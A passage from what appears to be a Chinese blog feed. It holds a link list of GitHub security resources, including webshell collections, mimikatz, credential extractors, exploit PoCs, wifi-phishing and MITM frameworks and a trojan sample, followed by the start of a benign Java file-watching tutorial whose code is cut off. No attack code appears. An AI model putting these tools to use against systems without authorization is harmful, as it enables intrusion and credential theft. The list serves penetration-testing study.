OWASP Node Goat</strong><ul><li><a href="https://github.com/cr0hn/vulnerable-node" target="_blank" rel="external">https://github.com/cr0hn/vulnerable-node</a></li></ul></li></ul><h3 id="花式扫描器"><a href="#花式扫描器" class="headerlink" title="花式扫描器"></a>花式扫描器</h3><ul><li><strong>端口扫描器Nmap</strong><ul><li><a href="https://github.com/nmap/nmap" target="_blank" rel="external">https://github.com/nmap/nmap</a></li></ul></li><li><strong>本地网络扫描器</strong><ul><li><a href="https://github.com/SkyLined/LocalNetworkScanner" target="_blank" rel="external">https://github.com/SkyLined/LocalNetworkScanner</a></li></ul></li><li><strong>子域名扫描器</strong><ul><li><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="external">https://github.com/lijiejie/subDomainsBrute</a></li></ul></li><li><strong>漏洞路由扫描器</strong><ul><li><a href="https://github.com/jh00nbr/Routerhunter-2.0" target="_blank" rel="external">https://github.com/jh00nbr/Routerhunter-2.0</a></li></ul></li><li><strong>迷你批量信息泄漏扫描脚本</strong><ul><li><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="external">https://github.com/lijiejie/BBScan</a></li></ul></li><li><strong>Waf类型检测工具</strong><ul><li><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="external">https://github.com/EnableSecurity/wafw00f</a></li></ul></li></ul><h3 id="信息搜集工具"><a href="#信息搜集工具" class="headerlink" title="信息搜集工具"></a>信息搜集工具</h3><ul><li><strong>社工插件，可查找以email、phone、username的注册的所有网站账号信息</strong><ul><li><a href="https://github.com/n0tr00t/Sreg" target="_blank" rel="external">https://github.com/n0tr00t/Sreg</a></li></ul></li><li><strong>Github信息搜集，可实时扫描查询git最新上传有关邮箱账号密码信息</strong><ul><li><a href="https://github.com/sea-god/gitscan" target="_blank" rel="external">https://github.com/sea-god/gitscan</a></li></ul></li><li><strong>github Repo信息搜集工具</strong><ul><li><a href="https://github.com/metac0rtex/GitHarvester" target="_blank" rel="external">https://github.com/metac0rtex/GitHarvester</a></li></ul></li></ul><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><ul><li><strong>webshell大合集</strong><ul><li><a href="https://github.com/tennc/webshell" target="_blank" rel="external">https://github.com/tennc/webshell</a></li></ul></li><li><strong>渗透以及web攻击脚本</strong><ul><li><a href="https://github.com/brianwrf/hackUtils" target="_blank" rel="external">https://github.com/brianwrf/hackUtils</a></li></ul></li><li><strong>web渗透小工具大合集</strong><ul><li><a href="https://github.com/rootphantomer/hack_tools_for_me" target="_blank" rel="external">https://github.com/rootphantomer/hack_tools_for_me</a></li></ul></li><li><strong>XSS数据接收平台</strong><ul><li><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="external">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></li></ul></li><li><strong>XSS与CSRF工具</strong><ul><li><a href="https://github.com/evilcos/xssor" target="_blank" rel="external">https://github.com/evilcos/xssor</a></li></ul></li><li><strong>Short for command injection exploiter，web向命令注入检测工具</strong><ul><li><a href="https://github.com/stasinopoulos/commix" target="_blank" rel="external">https://github.com/stasinopoulos/commix</a></li></ul></li><li><strong>数据库注入工具</strong><ul><li><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="external">https://github.com/sqlmapproject/sqlmap</a></li></ul></li><li><strong>Web代理，通过加载sqlmap api进行sqli实时检测</strong><ul><li><a href="https://github.com/zt2/sqli-hunter" target="_blank" rel="external">https://github.com/zt2/sqli-hunter</a></li></ul></li><li><strong>新版中国菜刀</strong><ul><li><a href="https://github.com/Chora10/Cknife" target="_blank" rel="external">https://github.com/Chora10/Cknife</a></li></ul></li><li><strong>.git泄露利用EXP</strong><ul><li><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="external">https://github.com/lijiejie/GitHack</a></li></ul></li><li><strong>浏览器攻击框架</strong><ul><li><a href="https://github.com/beefproject/beef" target="_blank" rel="external">https://github.com/beefproject/beef</a></li></ul></li><li><strong>自动化绕过WAF脚本</strong><ul><li><a href="https://github.com/khalilbijjou/WAFNinja" target="_blank" rel="external">https://github.com/khalilbijjou/WAFNinja</a></li></ul></li><li><strong>http命令行客户端，可以从命令行构造发送各种http请求（类似于Curl）</strong><ul><li><a href="https://github.com/jkbrzt/httpie" target="_blank" rel="external">https://github.com/jkbrzt/httpie</a></li></ul></li><li><strong>浏览器调试利器</strong><ul><li><a href="https://github.com/firebug/firebug" target="_blank" rel="external">https://github.com/firebug/firebug</a></li></ul></li><li><strong>一款开源WAF</strong><ul><li><a href="https://github.com/SpiderLabs/ModSecurity" target="_blank" rel="external">https://github.com/SpiderLabs/ModSecurity</a></li></ul></li></ul><h3 id="windows域渗透工具"><a href="#windows域渗透工具" class="headerlink" title="windows域渗透工具"></a>windows域渗透工具</h3><ul><li><strong>windows渗透神器</strong><ul><li><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="external">https://github.com/gentilkiwi/mimikatz</a></li></ul></li><li><strong>Powershell渗透库合集</strong><ul><li><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="external">https://github.com/PowerShellMafia/PowerSploit</a></li></ul></li><li><strong>Powershell tools合集</strong><ul><li><a href="https://github.com/clymb3r/PowerShell" target="_blank" rel="external">https://github.com/clymb3r/PowerShell</a></li></ul></li></ul><h3 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h3><ul><li><strong>Web向Fuzz工具</strong><ul><li><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="external">https://github.com/xmendez/wfuzz</a></li></ul></li><li><strong>HTTP暴力破解，撞库攻击脚本</strong><ul><li><a href="https://github.com/lijiejie/htpwdScan" target="_blank" rel="external">https://github.com/lijiejie/htpwdScan</a></li></ul></li></ul><h3 id="漏洞利用及攻击框架"><a href="#漏洞利用及攻击框架" class="headerlink" title="漏洞利用及攻击框架"></a>漏洞利用及攻击框架</h3><ul><li><strong>msf</strong><ul><li><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="external">https://github.com/rapid7/metasploit-framework</a></li></ul></li><li><strong>Poc调用框架，可加载Pocsuite,Tangscan，Beebeeto等</strong><ul><li><a href="https://github.com/erevus-cn/pocscan" target="_blank" rel="external">https://github.com/erevus-cn/pocscan</a></li></ul></li><li><strong>Pocsuite</strong><ul><li><a href="https://github.com/knownsec/Pocsuite" target="_blank" rel="external">https://github.com/knownsec/Pocsuite</a></li></ul></li><li><strong>Beebeeto</strong><ul><li><a href="https://github.com/n0tr00t/Beebeeto-framework" target="_blank" rel="external">https://github.com/n0tr00t/Beebeeto-framework</a></li></ul></li></ul><h3 id="漏洞POC-amp-EXP"><a href="#漏洞POC-amp-EXP" class="headerlink" title="漏洞POC&amp;EXP"></a>漏洞POC&amp;EXP</h3><ul><li><strong>ExploitDB官方git版本</strong><ul><li><a href="https://github.com/offensive-security/exploit-database" target="_blank" rel="external">https://github.com/offensive-security/exploit-database</a></li></ul></li><li><strong>php漏洞代码分析</strong><ul><li><a href="https://github.com/80vul/phpcodz" target="_blank" rel="external">https://github.com/80vul/phpcodz</a></li></ul></li><li><strong>Simple test for CVE-2016-2107</strong><ul><li><a href="https://github.com/FiloSottile/CVE-2016-2107" target="_blank" rel="external">https://github.com/FiloSottile/CVE-2016-2107</a></li></ul></li><li><strong>CVE-2015-7547 POC</strong><ul><li><a href="https://github.com/fjserna/CVE-2015-7547" target="_blank" rel="external">https://github.com/fjserna/CVE-2015-7547</a></li></ul></li><li><strong>JAVA反序列化POC生成工具</strong><ul><li><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="external">https://github.com/frohoff/ysoserial</a></li></ul></li><li><strong>JAVA反序列化EXP</strong><ul><li><a href="https://github.com/foxglovesec/JavaUnserializeExploits" target="_blank" rel="external">https://github.com/foxglovesec/JavaUnserializeExploits</a></li></ul></li><li><strong>Jenkins CommonCollections EXP</strong><ul><li><a href="https://github.com/CaledoniaProject/jenkins-cli-exploit" target="_blank" rel="external">https://github.com/CaledoniaProject/jenkins-cli-exploit</a></li></ul></li><li><strong>CVE-2015-2426 EXP (windows内核提权)</strong><ul><li><a href="https://github.com/vlad902/hacking-team-windows-kernel-lpe" target="_blank" rel="external">https://github.com/vlad902/hacking-team-windows-kernel-lpe</a></li></ul></li><li><strong>use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示)</strong><ul><li><a href="https://github.com/hxer/vulnapp" target="_blank" rel="external">https://github.com/hxer/vulnapp</a></li></ul></li><li><strong>php7缓存覆写漏洞Demo及相关工具</strong><ul><li><a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="external">https://github.com/GoSecure/php7-opcache-override</a></li></ul></li><li><strong>XcodeGhost木马样本</strong><ul><li><a href="https://github.com/XcodeGhostSource/XcodeGhost" target="_blank" rel="external">https://github.com/XcodeGhostSource/XcodeGhost</a></li></ul></li></ul><h3 id="中间人攻击及钓鱼"><a href="#中间人攻击及钓鱼" class="headerlink" title="中间人攻击及钓鱼"></a>中间人攻击及钓鱼</h3><ul><li><strong>中间人攻击框架</strong><ul><li><a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="external">https://github.com/secretsquirrel/the-backdoor-factory</a></li><li><a href="https://github.com/secretsquirrel/BDFProxy" target="_blank" rel="external">https://github.com/secretsquirrel/BDFProxy</a></li><li><a href="https://github.com/byt3bl33d3r/MITMf" target="_blank" rel="external">https://github.com/byt3bl33d3r/MITMf</a></li></ul></li><li><strong>Inject code, jam wifi, and spy on wifi users</strong><ul><li><a href="https://github.com/DanMcInerney/LANs.py" target="_blank" rel="external">https://github.com/DanMcInerney/LANs.py</a></li></ul></li><li><strong>可扩展的中间人代理工具</strong><ul><li><a href="https://github.com/intrepidusgroup/mallory" target="_blank" rel="external">https://github.com/intrepidusgroup/mallory</a></li></ul></li><li><strong>wifi钓鱼</strong><ul><li><a href="https://github.com/sophron/wifiphisher" target="_blank" rel="external">https://github.com/sophron/wifiphisher</a></li></ul></li></ul><h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><ul><li><strong>密码破解工具</strong><ul><li><a href="https://github.com/shinnok/johnny" target="_blank" rel="external">https://github.com/shinnok/johnny</a></li></ul></li><li><strong>本地存储的各类密码提取利器</strong><ul><li><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="external">https://github.com/AlessandroZ/LaZagne</a></li></ul></li></ul><h3 id="二进制及代码分析工具"><a href="#二进制及代码分析工具" class="headerlink" title="二进制及代码分析工具"></a>二进制及代码分析工具</h3><ul><li><strong>二进制分析工具</strong><ul><li><a href="https://github.com/devttys0/binwalk" target="_blank" rel="external">https://github.com/devttys0/binwalk</a></li></ul></li><li><strong>系统扫描器，用于寻找程序和库然后收集他们的依赖关系，链接等信息</strong><ul><li><a href="https://github.com/quarkslab/binmap" target="_blank" rel="external">https://github.com/quarkslab/binmap</a></li></ul></li><li><strong>rp++ is a full-cpp written tool that aims to find ROP sequences in PE/Elf/Mach-O (doesn’t support the FAT binaries) x86/x64 binaries.</strong><ul><li><a href="https://github.com/0vercl0k/rp" target="_blank" rel="external">https://github.com/0vercl0k/rp</a></li></ul></li><li><strong>Windows Exploit Development工具</strong><ul><li><a href="https://github.com/lillypad/badger" target="_blank" rel="external">https://github.com/lillypad/badger</a></li></ul></li><li><strong>二进制静态分析工具（python）</strong><ul><li><a href="https://github.com/bdcht/amoco" target="_blank" rel="external">https://github.com/bdcht/amoco</a></li></ul></li><li><strong>Python Exploit Development Assistance for GDB</strong><ul><li><a href="https://github.com/longld/peda" target="_blank" rel="external">https://github.com/longld/peda</a></li></ul></li><li><strong>对BillGates Linux Botnet系木马活动的监控工具</strong><ul><li><a href="https://github.com/ValdikSS/billgates-botnet-tracker" target="_blank" rel="external">https://github.com/ValdikSS/billgates-botnet-tracker</a></li></ul></li><li><strong>木马配置参数提取工具</strong><ul><li><a href="https://github.com/kevthehermit/RATDecoders" target="_blank" rel="external">https://github.com/kevthehermit/RATDecoders</a></li></ul></li><li><strong>Shellphish编写的二进制分析工具（CTF向）</strong><ul><li><a href="https://github.com/angr/angr" target="_blank" rel="external">https://github.com/angr/angr</a></li></ul></li><li><strong>针对python的静态代码分析工具</strong><ul><li><a href="https://github.com/yinwang0/pysonar2" target="_blank" rel="external">https://github.com/yinwang0/pysonar2</a></li></ul></li><li><strong>一个自动化的脚本（shell）分析工具，用来给出警告和建议</strong><ul><li><a href="https://github.com/koalaman/shellcheck" target="_blank" rel="external">https://github.com/koalaman/shellcheck</a></li></ul></li><li><strong>基于AST变换的简易Javascript反混淆辅助工具</strong><ul><li><a href="https://github.com/ChiChou/etacsufbo" target="_blank" rel="external">https://github.com/ChiChou/etacsufbo</a></li></ul></li></ul><h3 id="EXP编写框架及工具"><a href="#EXP编写框架及工具" class="headerlink" title="EXP编写框架及工具"></a>EXP编写框架及工具</h3><ul><li><strong>二进制EXP编写工具</strong><ul><li><a href="https://github.com/t00sh/rop-tool" target="_blank" rel="external">https://github.com/t00sh/rop-tool</a></li></ul></li><li><strong>CTF Pwn 类题目脚本编写框架</strong><ul><li><a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="external">https://github.com/Gallopsled/pwntools</a></li></ul></li><li><strong>an easy-to-use io library for pwning development</strong><ul><li><a href="https://github.com/zTrix/zio" target="_blank" rel="external">https://github.com/zTrix/zio</a></li></ul></li><li><strong>跨平台注入工具（ Inject JavaScript to explore native apps on Windows, Mac, Linux, iOS and Android.）</strong><ul><li><a href="https://github.com/frida/frida" target="_blank" rel="external">https://github.com/frida/frida</a></li></ul></li></ul><h3 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h3><ul><li><strong>隐写检测工具</strong><ul><li><a href="https://github.com/abeluck/stegdetect" target="_blank" rel="external">https://github.com/abeluck/stegdetect</a></li></ul></li></ul><h3 id="各类安全资料"><a href="#各类安全资料" class="headerlink" title="各类安全资料"></a>各类安全资料</h3><ul><li><strong>域渗透教程</strong><ul><li><a href="https://github.com/l3m0n/pentest_study" target="_blank" rel="external">https://github.com/l3m0n/pentest_study</a></li></ul></li><li><strong>python security教程（原文链接<a href="http://www.primalsecurity.net/tutorials/python-tutorials/）" target="_blank" rel="external">http://www.primalsecurity.net/tutorials/python-tutorials/）</a></strong><ul><li><a href="https://github.com/smartFlash/pySecurity" target="_blank" rel="external">https://github.com/smartFlash/pySecurity</a></li></ul></li><li><strong>data_hacking合集</strong><ul><li><a href="https://github.com/ClickSecurity/data_hacking" target="_blank" rel="external">https://github.com/ClickSecurity/data_hacking</a></li></ul></li><li><strong>mobile-security-wiki</strong><ul><li><a href="https://github.com/exploitprotocol/mobile-security-wiki" target="_blank" rel="external">https://github.com/exploitprotocol/mobile-security-wiki</a></li></ul></li><li><strong>书籍《reverse-engineering-for-beginners》</strong><ul><li><a href="https://github.com/veficos/reverse-engineering-for-beginners" target="_blank" rel="external">https://github.com/veficos/reverse-engineering-for-beginners</a></li></ul></li><li><strong>一些信息安全标准及设备配置</strong><ul><li><a href="https://github.com/luyg24/IT_security" target="_blank" rel="external">https://github.com/luyg24/IT_security</a></li></ul></li><li><strong>APT相关笔记</strong><ul><li><a href="https://github.com/kbandla/APTnotes" target="_blank" rel="external">https://github.com/kbandla/APTnotes</a></li></ul></li><li><strong>Kcon资料</strong><ul><li><a href="https://github.com/knownsec/KCon" target="_blank" rel="external">https://github.com/knownsec/KCon</a></li></ul></li><li><strong>ctf及黑客资源合集</strong><ul><li><a href="https://github.com/bt3gl/My-Gray-Hacker-Resources" target="_blank" rel="external">https://github.com/bt3gl/My-Gray-Hacker-Resources</a></li></ul></li><li><strong>ctf和安全工具大合集</strong><ul><li><a href="https://github.com/zardus/ctf-tools" target="_blank" rel="external">https://github.com/zardus/ctf-tools</a></li></ul></li><li><strong>《DO NOT FUCK WITH A HACKER》</strong><ul><li><a href="https://github.com/citypw/DNFWAH" target="_blank" rel="external">https://github.com/citypw/DNFWAH</a></li></ul></li></ul><h3 id="各类CTF资源"><a href="#各类CTF资源" class="headerlink" title="各类CTF资源"></a>各类CTF资源</h3><ul><li><strong>近年ctf writeup大全</strong><ul><li><a href="https://github.com/ctfs/write-ups-2016" target="_blank" rel="external">https://github.com/ctfs/write-ups-2016</a></li><li><a href="https://github.com/ctfs/write-ups-2015" target="_blank" rel="external">https://github.com/ctfs/write-ups-2015</a></li><li><a href="https://github.com/ctfs/write-ups-2014" target="_blank" rel="external">https://github.com/ctfs/write-ups-2014</a></li></ul></li><li><strong>fbctf竞赛平台Demo</strong><ul><li><a href="https://github.com/facebook/fbctf" target="_blank" rel="external">https://github.com/facebook/fbctf</a></li></ul></li><li><strong>ctf Resources</strong><ul><li><a href="https://github.com/ctfs/resources" target="_blank" rel="external">https://github.com/ctfs/resources</a></li></ul></li></ul><h3 id="各类编程资源"><a href="#各类编程资源" class="headerlink" title="各类编程资源"></a>各类编程资源</h3><ul><li><strong>大礼包（什么都有）</strong><ul><li><a href="https://github.com/bayandin/awesome-awesomeness" target="_blank" rel="external">https://github.com/bayandin/awesome-awesomeness</a></li></ul></li><li><strong>bash-handbook</strong><ul><li><a href="https://github.com/denysdovhan/bash-handbook" target="_blank" rel="external">https://github.com/denysdovhan/bash-handbook</a></li></ul></li><li><strong>python资源大全</strong><ul><li><a href="https://github.com/jobbole/awesome-python-cn" target="_blank" rel="external">https://github.com/jobbole/awesome-python-cn</a></li></ul></li><li><strong>git学习资料</strong><ul><li><a href="https://github.com/xirong/my-git" target="_blank" rel="external">https://github.com/xirong/my-git</a></li></ul></li><li><strong>安卓开源代码解析</strong><ul><li><a href="https://github.com/android-cn/android-open-project-analysis" target="_blank" rel="external">https://github.com/android-cn/android-open-project-analysis</a></li></ul></li><li><strong>python框架，库，资源大合集</strong><ul><li><a href="https://github.com/vinta/awesome-python" target="_blank" rel="external">https://github.com/vinta/awesome-python</a></li></ul></li><li><strong>JS 正则表达式库（用于简化构造复杂的JS正则表达式）</strong></li><li><a href="https://github.com/VerbalExpressions/JSVerbalExpressions" target="_blank" rel="external">https://github.com/VerbalExpressions/JSVerbalExpressions</a></li></ul><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><ul><li><strong>python 正则表达式库（用于简化构造复杂的python正则表达式）</strong><ul><li><a href="https://github.com/VerbalExpressions/PythonVerbalExpressions" target="_blank" rel="external">https://github.com/VerbalExpressions/PythonVerbalExpressions</a></li></ul></li><li><strong>python任务管理以及命令执行库</strong><ul><li><a href="https://github.com/pyinvoke/invoke" target="_blank" rel="external">https://github.com/pyinvoke/invoke</a></li></ul></li><li><strong>python exe打包库</strong><ul><li><a href="https://github.com/pyinstaller/pyinstaller" target="_blank" rel="external">https://github.com/pyinstaller/pyinstaller</a></li></ul></li><li><strong>py3 爬虫框架</strong><ul><li><a href="https://github.com/orf/cyborg" target="_blank" rel="external">https://github.com/orf/cyborg</a></li></ul></li><li><strong>一个提供底层接口数据包编程和网络协议支持的python库</strong><ul><li><a href="https://github.com/CoreSecurity/impacket" target="_blank" rel="external">https://github.com/CoreSecurity/impacket</a></li></ul></li><li><strong>python requests 库</strong><ul><li><a href="https://github.com/kennethreitz/requests" target="_blank" rel="external">https://github.com/kennethreitz/requests</a></li></ul></li><li><strong>python 实用工具合集</strong><ul><li><a href="https://github.com/mahmoud/boltons" target="_blank" rel="external">https://github.com/mahmoud/boltons</a></li></ul></li><li><strong>python爬虫系统</strong><ul><li><a href="https://github.com/binux/pyspider" target="_blank" rel="external">https://github.com/binux/pyspider</a></li></ul></li><li><strong>ctf向 python工具包</strong><ul><li><a href="https://github.com/P1kachu/v0lt" target="_blank" rel="external">https://github.com/P1kachu/v0lt</a></li></ul></li></ul><h3 id="科学上网"><a href="#科学上网" class="headerlink" title="科学上网"></a>科学上网</h3><ul><li><strong>科学上网工具</strong><ul><li><a href="https://github.com/XX-net/XX-Net" target="_blank" rel="external">https://github.com/XX-net/XX-Net</a></li></ul></li></ul><h3 id="福利"><a href="#福利" class="headerlink" title="福利"></a>福利</h3><ul><li><strong>微信自动抢红包动态库</strong><ul><li><a href="https://github.com/east520/AutoGetRedEnv" target="_blank" rel="external">https://github.com/east520/AutoGetRedEnv</a></li></ul></li><li><strong>微信抢红包插件（安卓版）</strong><ul><li><a href="https://github.com/geeeeeeeeek/WeChatLuckyMoney" target="_blank" rel="external">https://github.com/geeeeeeeeek/WeChatLuckyMoney</a></li></ul></li><li><strong>神器</strong><ul><li><a href="https://github.com/yangyangwithgnu/hardseed" target="_blank" rel="external">https://github.com/yangyangwithgnu/hardseed</a></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;漏洞及渗透练习平台&quot;&gt;&lt;a href=&quot;#漏洞及渗透练习平台&quot; class=&quot;headerlink&quot; title=&quot;漏洞及渗透练习平台&quot;&gt;&lt;/a&gt;漏洞及渗透练习平台&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;WebGoat漏洞练习环境&lt;/strong&gt;&lt;ul&gt;
&lt;
      
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Github" scheme="http://yoursite.com/tags/Github/"/>
    
      <category term="安全" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Java监控文件夹或文件的变动</title>
    <link href="http://yoursite.com/2017/05/25/Java%E7%9B%91%E6%8E%A7%E6%96%87%E4%BB%B6%E5%A4%B9%E6%88%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%8F%98%E5%8A%A8/"/>
    <id>http://yoursite.com/2017/05/25/Java监控文件夹或文件的变动/</id>
    <published>2017-05-25T02:33:45.000Z</published>
    <updated>2017-11-27T13:44:34.044Z</updated>
    
    <content type="html"><![CDATA[<p>很多时候我们需要对文件夹或者文件进行监控，已观察其是否被删除、创建或者修改，然后根据文件的行为进行相应的后续处理，以往的话多数是通过轮询去观察文件夹或者文件的变动，这样肯定会经过磁盘的I/O的操作，大大的降低了效率，而且不能及时的响应，如果要提升响应速度必定会增加磁盘的占用，不是明智之举。</p><p>以往的文件夹监控流程如下:<br><img src="http://www.xdemo.org//qiniu/520/image/d54d7440d2320f3beb1668549bdc0734.png" alt="这里写图片描述"></p><p>JavaSE 1.7提供了相关的API，去监视文件或者文件夹的变动，主要的API都在java.nio.file下面，其大概流程如下：<br><img src="http://www.xdemo.org//qiniu/520/image/26f575315ce7d4d95fc71a994ab05fd0.png" alt="这里写图片描述"></p><h3 id="监控主类"><a href="#监控主类" class="headerlink" title="监控主类"></a>监控主类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> org.xdemo.superutil.j2se.filewatch;</div><div class="line"> </div><div class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.nio.file.LinkOption.NOFOLLOW_LINKS;</div><div class="line"> </div><div class="line"><span class="keyword">import</span> java.io.File;</div><div class="line"><span class="keyword">import</span> java.io.IOException;</div><div class="line"><span class="keyword">import</span> java.nio.file.FileSystems;</div><div class="line"><span class="keyword">import</span> java.nio.file.FileVisitResult;</div><div class="line"><span class="keyword">import</span> java.nio.file.Files;</div><div class="line"><span class="keyword">import</span> java.nio.file.Path;</div><div class="line"><span class="keyword">import</span> java.nio.file.Paths;</div><div class="line"><span class="keyword">import</span> java.nio.file.SimpleFileVisitor;</div><div class="line"><span class="keyword">import</span> java.nio.file.StandardWatchEventKinds;</div><div class="line"><span class="keyword">import</span> java.nio.file.WatchEvent;</div><div class="line"><span class="keyword">import</span> java.nio.file.WatchEvent.Kind;</div><div class="line"><span class="keyword">import</span> java.nio.file.WatchKey;</div><div class="line"><span class="keyword">import</span> java.nio.file.WatchService;</div><div class="line"><span class="keyword">import</span> java.nio.file.attribute.BasicFileAttributes;</div><div class="line"><span class="keyword">import</span> java.util.HashMap;</div><div class="line"><span class="keyword">import</span> java.util.Map;</div><div class="line"> </div><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment"> * 文件夹监控</span></div><div class="line"><span class="comment"> * </span></div><div class="line"><span class="comment"> * <span class="doctag">@author</span> Goofy &lt;a href="http://www.xdemo.org/"&gt;http://www.xdemo.org/&lt;/a&gt;</span></div><div class="line"><span class="comment"> * <span class="doctag">@Date</span> 2015年7月3日 上午9:21:33</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WatchDir</span> </span>&#123;</div><div class="line"> </div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> WatchService watcher;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;WatchKey, Path&gt; keys;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> subDir;</div><div class="line"> </div><div class="line">    <span class="comment">/**</span></div><div class="line"><span class="comment">     * 构造方法</span></div><div class="line"><span class="comment">     * </span></div><div class="line"><span class="comment">     * <span class="doctag">@param</span> file</span></div><div class="line"><span class="comment">     *            文件目录，不可以是文件</span></div><div class="line"><span class="comment">     * <span class="doctag">@param</span> subDir</span></div><div class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></div><div class="line"><span class="comment">     */</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">WatchDir</span><span class="params">(File file, <span class="keyword">boolean</span> subDir, FileActionCallback callback)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">        <span class="keyword">if</span> (!file.isDirectory())</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(file.getAbsolutePath() + <span class="string">"is not a directory!"</span>);</div><div class="line"> </div><div class="line">        <span class="keyword">this</span>.watcher = FileSystems.getDefault().newWatchService();</div><div class="line">        <span class="keyword">this</span>.keys = <span class="keyword">new</span> HashMap&lt;WatchKey, Path&gt;();</div><div class="line">        <span class="keyword">this</span>.subDir = subDir;</div><div class="line"> </div><div class="line">        Path dir = Paths.get(file.getAbsolutePath());</div><div class="line"> </div><div class="line">        <span class="keyword">if</span> (subDir) &#123;</div><div class="line">            registerAll(dir);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            register(dir);</div><div class="line">        &#125;</div><div class="line">        processEvents(callback);</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">    <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</div><div class="line">    <span class="keyword">static</span> &lt;T&gt; <span class="function">WatchEvent&lt;T&gt; <span class="title">cast</span><span class="params">(WatchEvent&lt;?&gt; event)</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> (WatchEvent&lt;T&gt;) event;</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">    <span class="comment">/**</span></div><div class="line"><span class="comment">     * 观察指定的目录</span></div><div class="line"><span class="comment">     * </span></div><div class="line"><span class="comment">     * <span class="doctag">@param</span> 